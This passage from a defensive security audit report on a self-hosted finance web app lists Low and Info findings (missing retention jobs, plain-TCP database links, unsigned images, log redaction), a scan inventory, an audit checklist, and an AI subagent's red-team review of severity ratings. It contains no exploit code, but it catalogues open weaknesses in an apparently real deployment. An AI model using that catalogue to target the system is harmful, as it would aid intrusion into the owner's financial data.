### F-151: No formal sensitive-data inventory / classification doc

- **Severity:** Low
- **OWASP:** N/A (documentation)
- **CWE:** CWE-1053
- **ASVS:** V8.3.4
- **Source:** S7 (`reports/18-asvs-l2.md` V8.3.4)
- **Location:** Repo-level documentation absence
- **Description:** No formal sensitive-data inventory.
  Code comments and CLAUDE.md implicitly identify PII and
  financial data; no formal policy document.
- **Evidence:** Grep of `docs/` returns no
  classification doc.
- **Impact:** Onboarding and regulatory-inquiry gaps.
- **Recommendation:** Write `docs/data-classification.md`.
- **Status:** Open

### F-152: Per-record access audit is incomplete

- **Severity:** Low
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-778
- **ASVS:** V8.3.5
- **Source:** S7 (`reports/18-asvs-l2.md` V8.3.5)
- **Location:** `app/utils/logging_config.py:153-180`
- **Description:** Request logging captures method, path,
  user_id, timestamp but not which specific transaction
  IDs/amounts were returned. F-028 covers mutation audit;
  read-side requires instrumentation.
- **Evidence:** Logging-config read.
- **Impact:** Granular data-access auditing incomplete
  for HIPAA / GDPR Article 30 on the read side.
- **Recommendation:** Defer for LAN deployment; add
  structured read-audit events on high-sensitivity
  endpoints when public / regulated.
- **Status:** Open

### F-153: No retention-policy enforcement for deleted data

- **Severity:** Low
- **OWASP:** N/A (GDPR compliance)
- **CWE:** CWE-1053
- **ASVS:** V8.3.8
- **Source:** S7 (`reports/18-asvs-l2.md` V8.3.8)
- **Location:** `app/config.py:50` defines
  `AUDIT_RETENTION_DAYS = 365`; no scheduled cleanup
- **Description:** Retention constant exists; no job
  enforces it. No retention policy for user/transaction/
  account data -- persists indefinitely.
- **Evidence:** Grep confirms no enforcement.
- **Impact:** Deleted-user data persists. GDPR
  right-to-erasure gap.
- **Recommendation:** Scheduled cleanup on
  `system.audit_log` (once rebuilt per F-028). Paired
  with F-093.
- **Status:** Open

### F-154: TLS not on internal connections (DB plain TCP)

- **Severity:** Low
- **OWASP:** A02:2021 Cryptographic Failures
- **CWE:** CWE-319
- **ASVS:** V9.2.2
- **Source:** S7 (`reports/18-asvs-l2.md` V9.2.2)
- **Location:** `docker-compose.yml:60` (DATABASE_URL)
- **Description:** Cloudflare→cloudflared is TLS;
  cloudflared→Gunicorn is plain HTTP on loopback (F-061);
  Gunicorn→Postgres is plain TCP (no `sslmode=require`).
- **Evidence:** URL config.
- **Impact:** Acceptable for single-host isolated
  backend (internal:true). Fails ASVS L2 strict.
- **Recommendation:** Add `?sslmode=require`; enable
  Postgres TLS with self-signed cert. Benefit small on
  single-host topology.
- **Status:** Open

### F-155: No Cosign / image-signature verification

- **Severity:** Low
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-494
- **ASVS:** V10.3.1
- **Source:** S7 (`reports/18-asvs-l2.md` V10.3.1)
- **Location:** `docker-compose.yml:51`; no Cosign in
  entrypoint
- **Description:** Image pulled from GHCR over HTTPS but
  not cryptographically signed. Compounds F-060.
- **Evidence:** Dockerfile/compose read.
- **Impact:** Supply-chain attack via GHCR.
- **Recommendation:** Sign images with Cosign at build;
  verify in `entrypoint.sh`. Pair with F-060.
- **Status:** Open

### F-156: server_tokens not explicitly disabled in nginx

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-200
- **ASVS:** V14.1.3, V14.3.2
- **Source:** S7 (`reports/18-asvs-l2.md` V14.1.3 + V14.3.2)
- **Location:** `nginx/nginx.conf` -- absence
- **Description:** nginx defaults `server_tokens on`,
  emitting nginx version. Both bundled and shared nginx
  configs should set `off`.
- **Evidence:** Grep zero hits.
- **Impact:** Version disclosure.
- **Recommendation:** Add `server_tokens off;` to both
  nginx configs (after F-021 version-controls them).
- **Status:** Open

### F-157: No config-drift integrity check

- **Severity:** Low
- **OWASP:** A05:2021 Security Misconfiguration
- **CWE:** CWE-1053
- **ASVS:** V14.1.5
- **Source:** S7 (`reports/18-asvs-l2.md` V14.1.5)
- **Location:** Operational absence
- **Description:** No tooling compares running container
  config against baseline.
- **Evidence:** No drift-check script.
- **Impact:** Config changes (intentional or attacker-
  driven) undetected between audits.
- **Recommendation:** Add `scripts/config_audit.py`
  emitting hash of security settings each deploy; compare
  to committed baseline.
- **Status:** Open

### F-158: Nmap tool version not captured in scan output

- **Severity:** Info
- **OWASP:** N/A (audit rigor)
- **CWE:** N/A
- **Source:** S3 Section 1I scan set
- **Location:** `scans/nmap-localhost.txt`
- **Description:** Nmap output does not record nmap
  version. Every other scanner did. Per workflow Section
  1K rules, missing tool version is an Info finding.
- **Evidence:** Read of scan file; no version banner.
- **Impact:** Audit re-run cannot reproduce exact scanner.
- **Recommendation:** On re-run, prepend `nmap --version
  | head -1` to the output.
- **Status:** Open

### F-159: Transitive dependencies not pinned in a lock file

- **Severity:** Info
- **OWASP:** A08:2021 Software and Data Integrity Failures
- **CWE:** CWE-1357
- **ASVS:** V14.2.4
- **Source:** S2 Section 1E (`reports/09-supply-chain.md`
  F-E-I2)
- **Location:** `requirements.txt` (direct only)
- **Description:** 16 direct deps pinned `==`. 17
  transitive deps not pinned in a lock file; can drift
  between installs.
- **Evidence:** Repo contents.
- **Impact:** Low. Direct `==` pinning resolves
  transitive deterministically at install time, but a
  transitive release could slip in unreviewed.
- **Recommendation:** `pip-compile` or commit
  `pip freeze` output. Include `--require-hashes`.
- **Status:** Open

### F-160: No formal redaction filter in logging config

- **Severity:** Info
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **CWE:** CWE-532
- **Source:** S1 Section 1C (`reports/07-manual-deep-dives.md`
  check 1C.9)
- **Location:** `app/utils/logging_config.py:74-95`
- **Description:** `filters` dict has only `request_id`;
  no scrubber. Current logging has zero observed PII/secret
  leaks (grep of password/totp/backup/secret/cookie
  patterns returns zero matches). Safety is by developer
  convention, not by enforcement.
- **Evidence:** Full read.
- **Impact:** None today. A future regression would have
  no scrubber.
- **Recommendation:** Defense-in-depth. Add
  `SensitiveFieldScrubber(logging.Filter)` that walks
  `record.args` and `record.msg` for known sensitive
  patterns and rewrites to `"[REDACTED]"`.
- **Status:** Fixed in C-16 (5ed0334, 2026-05-06).
  `app/utils/logging_config.py:297` defines
  `SensitiveFieldScrubber(logging.Filter)`, attached via the
  `filters` config block; the filter walks `record.args` and
  `record.msg` and rewrites password / totp / backup / secret /
  cookie patterns to `[REDACTED]`. The substitution is
  idempotent so a second pass cannot re-match the literal
  redaction marker.

### Informational observations (rolled up)

Flagged at Info in session reports; no defect. Recorded
for future readers.

- **F-I-01 (F-A-10).** `_is_safe_redirect` unused on
  `/change_password`. Route always redirects to security
  settings. 1C.4 also suggests adding `\x00` to the
  control-character rejection set as defense-in-depth.
- **F-I-02 (F-A-11).** Session fixation defense relies on
  Flask's cookie-session semantics, not on server-side
  session ID rotation. F-038 upgrades to Medium for ASVS
  compliance.
- **F-I-03 (F-A-12).** `require_owner`'s `role_id`
  fallback is defense-in-depth for test fixtures; no code
  path can produce `role_id=NULL`. Preliminary Finding #2
  RESOLVED.
- **F-I-04 (F-A-13).** Access-control tests exercise one
  HTMX route; DAST probe covers the rest.
- **F-I-05 (F-B2-05).** Codebase uniformly uses
  ROUND_HALF_UP; no drift from mixed rounding.
- **F-I-06 (F-B2-07).** `recurrence_engine._get_transaction_amount`
  catches broad exceptions that should surface as 500s;
  correctness/observability note.
- **F-I-07 (F-D-I1).** TLS terminated at shared nginx for
  LAN traffic; repo nginx.conf comment is misleading.
  See F-021.
- **F-I-08 (F-D-I2).** Secrets via env vars: accepted
  practice for single-host compose. F-148 tracks ASVS
  gap.
- **F-I-09 (F-D-I3).** Gunicorn runtime confirms rate-limit
  multiplication (F-034).
- **F-I-10 (F-E-I1).** Three direct deps have single
  maintainers: Flask-Limiter, Flask-Migrate, psycopg2.
  All active.
- **F-I-11 (F-E-I3).** gunicorn in Dockerfile, not
  `requirements.txt`. Trivy image scan confirms clean.
- **F-I-12 (F-G-I1).** Dockerfile passes trivy config
  scan: non-root, HEALTHCHECK, no unsafe ADD/RUN/COPY.
- **F-I-13 (F-H-I1).** Host firewall active with
  non-empty ruleset.
- **F-I-14 (F-H-I2).** Docker daemon not on TCP; only
  Unix socket.
- **F-I-15 (F-H-I3).** UniFi MongoDB without auth: non-
  Shekel hardening. Out of scope.
- **F-I-16 (L1-d, L1-e, I-P3, I-P4).** Retirement-dashboard
  truthiness patterns; non-integer Decimal exponents
  (safe); 8 `sum()` calls without explicit
  `Decimal("0")` start (latent).
- **F-I-17 (F-S6-C6-04).** Several FK columns lack
  indexes but current workload doesn't need them.
- **F-I-18 (F-C-19).** App HEALTHCHECK uses `start_period`
  but not `start_interval`. Cosmetic.

---

## Accepted Risks

Empty at the end of Phase 1. This section will be populated
during Phase 2 triage. Likely candidates to become Accepted
Risks based on S7 ASVS commentary: F-092 (WebAuthn), F-093
(export/delete), F-094 (privacy policy), F-147 (rest
encryption), F-148 (secrets manager), F-149 (memory
exposure), F-152 (read-record audit), F-154 (internal TLS).
Every other finding's expected disposition is Fix.

---

## Scan Inventory

Every file under `scans/` and `sbom/`, and every report
under `reports/`, has been consumed by at least one finding
or recorded as a clean negative result. No orphans.

### Reports consumed

| Report | Findings referenced |
|---|---|
| `reports/01-identity.md` (S1 1A Identity) | F-002, F-003, F-004, F-030, F-031, F-032, F-033, F-038, F-083, F-084, F-085, F-I-01..F-I-04 |
| `reports/02a-routes.md` (S1 1A Routes) | F-029, F-039, F-040, F-041, F-042, F-043, F-044, F-087, F-098, F-099, F-145, F-I-18 |
| `reports/02b-services.md` (S1 1A Services) | F-007, F-009, F-046, F-100, F-101, F-I-05, F-I-06 |
| `reports/03-config-deploy.md` (S1 1A Config) | F-015, F-016, F-017, F-018, F-034, F-035, F-036, F-037, F-060, F-061, F-097, F-108, F-109, F-110, F-111, F-112 |
| `reports/04-bandit.md` (S1 1B Bandit) | 0 new; 5 hits mapped to F-145 (B110) or rejected as noise (B704 false positives). Artifacts at `scans/bandit.*`. |
| `reports/05-semgrep.md` (S1 1B Semgrep) | 0 findings. 151 Python rules ran clean across 99 files. Artifacts at `scans/semgrep.*`. |
| `reports/06-pip-audit.md` (S1 1B pip-audit) | 0 findings; 33 deps all 0 CVEs. Preliminary #5 RESOLVED. Staleness at F-058/F-059/F-119. |
| `reports/07-manual-deep-dives.md` (S1 1C) | F-080, F-086, F-160; confirmations F-002..F-005, F-030, F-033, F-034, F-015 |
| `reports/08-runtime.md` (S2 1D) | F-020, F-021, F-022, F-053, F-054, F-055, F-056, F-113..F-117, F-I-07..F-I-09 |
| `reports/09-supply-chain.md` (S2 1E) | F-058, F-059, F-118, F-119, F-159, F-I-10, F-I-11 |
| `reports/10-git-history.md` (S2 1F) | F-001 |
| `reports/11-container-image.md` (S2 1G) | F-025, F-062, F-120, F-I-12 |
| `reports/12-host-hardening.md` (S2 1H) | F-023, F-024, F-057, F-065..F-067, F-121..F-125, F-I-13..F-I-15 |
| `reports/13-attack-surface.md` (S3 1I) | F-057 (dev DB), F-063, F-064, F-021 xref, F-054 xref, F-128..F-130 |
| `reports/14-threat-model.md` (S3 1J STRIDE) | F-081, F-082; threat cross-refs for F-028, F-030, F-034. Drives the Top 3 Risks section. |
| `reports/15-idor-dast-design.md` (S4 1M design) | No findings (design). Probe coverage described. |
| `reports/15-idor-dast.md` (S4 1M results) | F-087. 270 requests, 0 IDORs. |
| `reports/16-business-logic.md` (S5 1L) | F-008, F-009, F-010, F-011, F-012, F-047..F-052, F-100..F-107, F-126, F-127, F-I-16 |
| `reports/17-migrations-schema.md` (S6 1N) | F-026, F-027, F-028, F-068..F-073, F-076..F-079, F-131..F-140, F-I-17 |
| `reports/18-asvs-l2.md` (S7 1O) | F-004, F-005, F-006, F-018, F-019, F-030, F-038, F-045, F-086, F-088..F-096, F-108, F-141..F-157 |

### Scans directory (79 files)

| Scan file(s) | Consumed by |
|---|---|
| `bandit.json`, `bandit.txt` | `reports/04-bandit.md` |
| `semgrep.json`, `semgrep.txt` | `reports/05-semgrep.md` |
| `pip-audit.json`, `pip-audit.txt` | `reports/06-pip-audit.md`, `reports/09-supply-chain.md` |
| `trivy-sbom.json`, `trivy-sbom.txt` | `reports/09-supply-chain.md` |
| `trivy-image.json`, `trivy-image.txt` | `reports/11-container-image.md` |
| `trivy-config.json`, `trivy-config.txt` | `reports/11-container-image.md` |
| `gitleaks.json`, `gitleaks.sarif` | `reports/10-git-history.md` |
| `detect-secrets-baseline.json` | `reports/10-git-history.md` |
| `lynis.log`, `lynis-report.dat` | `reports/12-host-hardening.md` |
| `docker-bench.txt` | `reports/12-host-hardening.md` |
| `container-config.json`, `container-hostconfig.json`, `container-logs.txt` | `reports/08-runtime.md` |
| `nginx-config.json`, `nginx-hostconfig.json` | `reports/08-runtime.md` |
| `db-config.json`, `db-hostconfig.json` | `reports/08-runtime.md` |
| `networks.json` | `reports/08-runtime.md` |
| `host-listening-ports.txt` | `reports/13-attack-surface.md` |
| `docker-networks.txt`, `docker-networks-detail.json` | `reports/13-attack-surface.md`, `reports/08-runtime.md` |
| `nmap-localhost.txt` | `reports/13-attack-surface.md` (version gap: F-158) |
| `cloudflared-ingress.txt` | `reports/13-attack-surface.md` |
| `prod-compose-override.txt` | `reports/13-attack-surface.md` |
| `homelab-compose.txt` | `reports/13-attack-surface.md` |
| `shared-nginx.conf.txt`, `shared-nginx-shekel-vhost.conf.txt` | `reports/13-attack-surface.md`, `reports/08-runtime.md` |
| `idor-probe.json` | `reports/15-idor-dast.md` |
| `schema-*.txt` (56 per-table dumps across auth, budget, ref, salary) | `reports/17-migrations-schema.md` |

### SBOM directory (3 files)

| SBOM file | Consumed by |
|---|---|
| `sbom.json` (CycloneDX JSON) | `reports/09-supply-chain.md` |
| `sbom.xml` (CycloneDX XML) | `reports/09-supply-chain.md` |
| `resolved-tree.json` (pip resolved tree, 26 pkgs) | `reports/09-supply-chain.md` |

---

## Verification the audit was thorough

Per the workflow checklist at the end of
`docs/security-audit-workflow.md`:

- [x] `findings.md` has entries for every OWASP A01-A10
  category. Mapping spot-check: A01 F-007/029/039/043/044/045/
  087/098; A02 F-001/016..018/030/031/141/147..149/154; A03
  F-011..014/040..042/074..077/106/107; A04 F-007..010/046..052/
  068/077/081/102..105/136; A05 F-015/020/021/036/037/053..057/
  061/063/064/066/067/097/108..112/115..117/121/122/124/125/156/
  157; A06 F-025/058/059/062/067/119/120; A07 F-002..006/022/
  032/033/038/041/053/086/088..092/095/125/143; A08 F-026/027/
  060/070..072/131..134/155/159; A09 F-028/065/080/114/123/142/
  144/146/150/152/153/160.
- [x] All eight workflow-original domain reports exist
  under `reports/` (19 actual reports; Subagent B was split
  into B1/B2; 1M produced design + results; 1A Identity
  report is 01; 1A Config is 03).
- [x] All scanner outputs exist under `scans/`; see Scan
  Inventory.
- [x] SBOM exists under `sbom/`; consumed by
  `reports/09-supply-chain.md`.
- [x] Every medium-or-higher finding has file:line
  reference and quoted evidence.
- [x] All six preliminary findings resolved. #1 CONFIRMED
  (F-108), #2 RESOLVED (F-I-03), #3 CONFIRMED (F-018, F-036,
  F-037), #4 CONFIRMED (F-034), #5 RESOLVED (pip-audit +
  trivy both 0 CVEs) with staleness at F-058/F-059, #6
  CONFIRMED (F-030).
- [x] Runtime drift check run for nginx.conf, gunicorn.conf.py,
  compose; see `reports/08-runtime.md`.
- [x] STRIDE threat model covers 6 assets x 4 attackers x 6
  categories = 144 cells.
- [x] ASVS L2 mapping covers V2, V3, V4, V5, V6, V7, V8, V9,
  V10, V14. 25 Fails + 22 Partials converted to findings;
  101 Pass cite file:line; 33 N-A cite scope exclusions.
- [x] Business-logic report documents type purity,
  concurrency/TOCTOU, transfer invariants, rounding, negative
  amounts, idempotency.
- [x] Migration report catalogs every Alembic migration with
  Pass/Fail for downgrade and destructive-op review; live
  schema drift diffed.
- [x] IDOR probe `scans/idor-probe.json` exists; ran against
  dev compose only (safety rail confirmed
  `url_scheme=http, url_host=127.0.0.1, url_port=5000`); 270
  requests, 0 IDORs. Rerunnable at
  `scripts/audit/idor_probe.py`.
- [x] Scan Inventory accounts for every `scans/` and `reports/`
  file.
- [x] pip-audit vs trivy-sbom discrepancy reconciled: 0 vs 0.
- [x] Red-team appendix appended below after Section 1P.
- [x] Accepted Risks section exists with Phase 2 candidates.
- [x] Constant-time compare checks completed per 1C.1.a-c.
- [x] Fernet TOTP-key rotation story documented (F-030).

---

## Red Team Appendix (Section 1P)

- Subagent: fresh Explore subagent, Session S8.
- Scope: `docs/audits/security-2026-04-15/findings.md` only.
  The red-team pass did not reload any session report under
  `reports/`, to avoid anchoring on the same evidence the
  consolidator used.
- Date: 2026-04-18.
- Mandate: per workflow Section 1P, look for (1) severity
  inflation, (2) severity deflation, (3) verification-by-
  assertion. Produce challenges as suggestions; do NOT
  overwrite the consolidator's findings. Developer decides
  in Phase 2 triage whether to accept each challenge or
  defend the original rating in writing.

### Summary

- **Findings challenged:** 2
- **Proposed severity inflation corrections (High -> Medium or lower):** 0
- **Proposed severity deflation corrections (Info -> higher):** 0
- **Proposed severity deflation corrections (Low -> Info):** 1 (F-087)
- **Evidence-quality challenges (verification-by-assertion):** 0
- **Findings affirmed by explicit review (the six the
  consolidator flagged as borderline):** 4 (F-004, F-009,
  F-028, F-030); 1 with scope-clarification caveat (F-010);
  1 deflation proposed (F-087)
- **Overall: findings.md holds up as the priority-ordering
  artifact for Phase 2.** No inflation patterns detected.
  Evidence chains are concrete and reproducible in every
  case checked. The one proposed deflation and the one
  scope-clarification are minor; neither reshuffles the
  top of the priority list.

### Per-finding challenges

#### F-010: PATCH endpoints accept stale form amounts -- silent lost update

- **Current severity:** High
- **Proposed severity:** High (affirmed with scope
  clarification)
- **Class:** affirmed-with-caveat
- **Reason:** The finding is correct and the vulnerability
  is real. But the severity is rated uniformly High across
  every PATCH endpoint without distinguishing between the
  current (solo-owner) deployment and the stated "intends
  to go public" future. For a solo-owner app, concurrent
  multi-tab stale-form edits are rare enough that Medium
  would also be defensible. For the explicit public-release
  threat model that the audit scope calls out, High is
  correct. The consolidator's choice is defensible for the
  stated scope.
- **What would change the verdict:** Keeping as High is
  appropriate given the "intending public release"
  criterion in audit scope. If the scope were narrowed to
  "single-operator personal app in perpetuity," Medium
  would be justified. Suggestion: add a parenthetical
  "(Medium for solo-operator scope; High for public
  deployment)" to the severity line so the distinction is
  explicit rather than implicit.

#### F-087: Mixed 302/404 response convention for cross-user access (51 routes)

- **Current severity:** Low (compliance / pattern
  inconsistency)
- **Proposed severity:** Info
- **Class:** deflation (Low -> Info)
- **Reason:** The S4 DAST probe tested 270 cross-user
  requests and confirmed zero exploitable IDORs despite
  the inconsistency. Both 302 (redirect + flash to the
  attacker's own index) and 404 successfully deny access
  without leaking victim data. The issue is purely
  code-pattern consistency for future maintainability. The
  finding is already scoped as "compliance / pattern
  inconsistency" with severity Low, which is close to the
  Info line; the absence of any current exploit path
  argues for Info. The inconsistency is worth fixing for
  uniformity but not for security.
- **What would change the verdict:** Evidence of any route
  where a 302 redirect leaks victim data in the Location
  header or in the flash message, or evidence that the
  inconsistency has led to a regression where a new
  handler inherited the weaker 302 pattern and then later
  exposed data. Currently neither exists; the probe
  verified all denials. Affirming as Low is also
  defensible if the developer wants to keep it visible in
  the Phase 2 fix queue.

### Findings explicitly affirmed by red-team scrutiny

These are the six the consolidator flagged as borderline
and explicitly asked the red team to scrutinize.

#### F-004: Backup code entropy is 32 bits, below ASVS L2

- **Verdict:** Affirmed as High. The consolidator rerates
  from S1's Info to S7's High, and the rerating is correct.
  Rate limit + bcrypt alone is insufficient against the
  ASVS L2 threat model. Offline GPU attack on leaked
  bcrypt hashes is seconds on consumer hardware at 32-bit
  entropy; the rate limit only addresses online attack.
  The "if hashes leak" scenario is the ASVS L2 baseline,
  not a remote edge case.

#### F-009: Anchor balance updates are last-writer-wins

- **Verdict:** Affirmed as High. The consolidator took S5's
  High rating over S1's Medium, and the S5 rating reflects
  the concrete double-click scenario (not speculative). The
  impact (silent balance rollback cascading through 26
  pay-period projections) is significant. For a money app
  intending public release with companion-role concurrent
  editing, High is the correct rating.

#### F-028: Audit-log PostgreSQL triggers entirely missing from live DB

- **Verdict:** Affirmed as High. Evidence is reproducible
  and not verification-by-assertion. S6 ran direct
  PostgreSQL queries
  (`SELECT count(*) FROM information_schema.tables WHERE
   table_schema='system' AND table_name='audit_log';`,
  `SELECT proname FROM pg_proc WHERE proname='audit_trigger_func';`,
  `SELECT tgname FROM pg_trigger WHERE tgname LIKE 'audit_%';`)
  and received concrete 0-row results. The live DB's
  `alembic_version` is AFTER the migration that should have
  created the triggers. This is a factual database state,
  not a code-reading assertion. Impact (zero audit trail on
  financial mutations in production) is severe. High is
  correct.

#### F-030: TOTP_ENCRYPTION_KEY has no rotation path

- **Verdict:** Affirmed as High. The consolidator took S7's
  High over S1's Medium, and the rerating is correct for
  the public-release threat model. Key rotation without
  user re-enrollment is ASVS L2 V6.2.4 baseline. The
  current design makes rotation operationally infeasible
  (users will not accept "re-enroll every MFA device"),
  which means a compromised key is unrecoverable in
  practice. For solo-owner in perpetuity this might be
  Medium; for the stated public-release scope it is High.

#### F-004 (second check) and F-030 (second check)

- Both of these would downgrade to Medium only if the
  deployment were permanently single-owner. The workflow
  scope statement explicitly contemplates public release,
  so the consolidator's High ratings are correct for the
  stated scope. If the developer decides during Phase 2
  triage that public release is permanently off the roadmap,
  both can be re-rated downward -- but that is a scope
  decision, not a severity error.

### Evidence-quality challenges

None. Every finding I spot-checked has either:

- A concrete code citation (file:line + quoted snippet),
- A concrete scan-output citation (e.g. F-028's direct
  Postgres queries, F-001's gitleaks match, F-025's trivy
  CVE entries),
- A concrete test-output citation (F-087's 270 requests
  from `scans/idor-probe.json`), or
- An architectural fact that can be reproduced by reading
  the same file (F-015's `nginx.conf` and
  `gunicorn.conf.py` quotes).

No finding relies on "the consolidator said so" without a
reproducible reference. This is unusual for an audit of
this size and reflects well on the input sessions; it is
also why the red-team appendix is short.

### New concerns surfaced during red-team pass

These are NOT new findings. They are observations that
emerged while reading findings.md and that the consolidator
may want to fold into future audit cycles or into the
Phase 2 triage notes.

- **F-026 + F-028 share a root-cause pattern.** Both
  describe "infrastructure declared in a migration but
  missing from live DB." F-028 (audit triggers) and F-026
  (NOT NULL column without backfill, yet populated in live
  DB) together suggest production migrations have been
  applied in ways not recorded in the migration files
  themselves -- either via manual backfills, manual DDL, or
  recovery from pre-migration backups. A post-audit step
  should verify whether the gap is (a) manual restoration
  that needs to be automated into the migration chain, (b) a
  historical artifact of an old deploy process, or (c)
  data-recovery residue. The pattern "alembic_version says
  applied, reality shows gaps" should trigger a database
  reconciliation check in deployment tooling, so the next
  `flask db upgrade` against a bare DB can reproduce prod
  state.

- **F-015 + F-061 + F-063 form a cohesive WAN-path gap.**
  F-063 notes cloudflared bypasses both nginxes on WAN
  entry; F-061 notes cloudflared has no Access policy in
  the committed config; F-015 notes Gunicorn trusts
  `X-Forwarded-For` from any private-range IP. Reading
  them as a set, the practical consequence for WAN traffic
  is: no edge auth, no nginx-layer body-size ceiling, no
  real-IP normalization. The consolidator flagged the three
  as separate findings at High/Medium/High (F-015/F-061/
  F-063) which is correct granularity, but the Phase 2
  remediation plan should schedule them together because
  fixing one without the others leaves the overall gap
  partially open.

- **F-009, F-010, and F-050 share an infrastructure gap.**
  All three are concurrency / idempotency findings that
  would be addressed by a common pattern (version_id_col or
  conditional UPDATE + idempotency key). The consolidator
  files them separately with distinct recommendations; the
  Phase 2 plan could unify the remediation into a single
  "mutation-endpoint concurrency hardening" workstream that
  touches every Account, Transaction, Transfer, and related
  model.

- **The mention of `scripts/repair_orphaned_transfers.py`
  in F-046 is a powerful signal.** That script exists
  because a transfer-shadow invariant has ALREADY been
  violated in production once. The consolidator cites it as
  evidence that the F-046 gap is not hypothetical. Phase 2
  triage should ensure that (a) the script is included in
  any incident-response runbook, (b) the bug that caused
  the original violation is documented so reviewers of
  future transfer-related code know the precedent, and (c)
  F-046's partial unique index is landed as a priority
  because the precedent shows the gap manifests in
  practice.

### Overall assessment

`findings.md` holds up as a rigorous priority-ordering
artifact for Phase 2. The 29 High findings (plus the one
Critical) cluster into coherent threat domains: identity/
MFA (F-002-F-006, F-030), business-logic race conditions
(F-007-F-010), input-validation schema/DB mismatches
(F-011-F-014), infrastructure / deployment configuration
(F-015-F-025), and database integrity (F-026-F-028). Each
cluster has a recognizable remediation path and none
depends on another cluster's prerequisites except where
the consolidator already called out the dependency
explicitly.

Evidence quality is consistently strong. No
verification-by-assertion patterns were found. Quoted
code, scan output, and DAST results appear where a claim
needs reproducible support. The consolidator appropriately
took the higher of divergent ratings when S1 and S7 split
on a finding (F-004, F-030), which is correct: for a money
app, the conservative rating is the safer one to carry
forward into Phase 2.

Severity distribution is plausible (1 Critical / 30 High /
65 Medium / 45 Low / 19 Info). I see no cluster where the
severities skew systematically high (inflation) or
systematically low (deflation). The one deflation I
proposed (F-087) is marginal and the one scope-clarification
(F-010) does not change the rating.

The Top 3 Risks section is defensible given the full
finding set:

1. **Audit-log gap.** Top 1 is correctly the forensic trail
   -- F-028 (DB triggers missing) + F-080 (Python-layer
   structured logging at 14% of routes) + F-082 (no
   off-host shipping). These three together are the main
   audit-integrity blocker and they reinforce each other.
2. **Five one-line crypto fixes.** Top 2 correctly bundles
   five independent auth-posture gaps with cheap remediation
   and meaningful impact (F-001, F-004, F-017, F-018,
   F-019). For operator priority ordering, this cluster is
   higher-leverage than any single High.
3. **Anchor-balance + transfer-invariant correctness.** Top
   3 is the money-correctness cluster (F-007, F-008, F-009,
   F-010). These are the findings that, if unaddressed,
   will manifest as visible balance drift for real users.

The one item I would add to the Phase 2 process (not to
findings.md itself, but to the triage note) is: **treat
F-028 as a blocking precondition for any public-release
decision.** The current production database has no audit
trail for financial mutations. That is not a Medium-
severity compliance gap; it is a genuine "you cannot
defensibly operate as a money app at public scale in this
state" problem. The consolidator's High rating is correct;
the red-team view is simply to flag that it probably wants
to sit at the top of whatever week-one remediation queue
is built.

Ratings and evidence are in good shape. No reshuffling of
the top of the list is warranted.


